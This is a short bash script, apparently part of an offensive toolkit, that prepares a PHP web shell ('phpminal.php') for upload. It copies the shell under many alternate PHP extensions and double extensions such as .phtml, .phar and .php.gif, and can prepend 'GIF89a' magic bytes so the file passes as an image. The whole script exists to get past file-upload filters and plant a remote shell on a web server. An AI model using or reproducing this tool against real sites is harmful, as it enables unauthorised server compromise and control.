#!/bin/bash
if [ ! -d "ready2upload" ]
then
    mkdir ready2upload
fi

if [ "$1" == "-h" ]
then
    echo ""
    echo "USAGE:"
    echo "$0 [OPTIONS]"
    echo ""
    echo "Options:" 
    echo "  -g ... Inject GIF89a in the files to imitate a GIF file"
    echo ""
    exit 0
fi

if [ "$1" == "-g" ]
then
    echo -n "GIF89a" > t.php
    cat phpminal.php >> t.php
else
    cp phpminal.php t.php
fi

cp t.php ready2upload/t.php
cp t.php ready2upload/t.php3
cp t.php ready2upload/t.php4
cp t.php ready2upload/t.php5
cp t.php ready2upload/t.php7
cp t.php ready2upload/t.php8
cp t.php ready2upload/t.pht
cp t.php ready2upload/t.phtm
cp t.php ready2upload/t.phtml
cp t.php ready2upload/t.phar
cp t.php ready2upload/t.phpt
cp t.php ready2upload/t.phps
cp t.php ready2upload/t.gif.php
cp t.php ready2upload/t.php.gif

rm t.php

echo "DONE!"
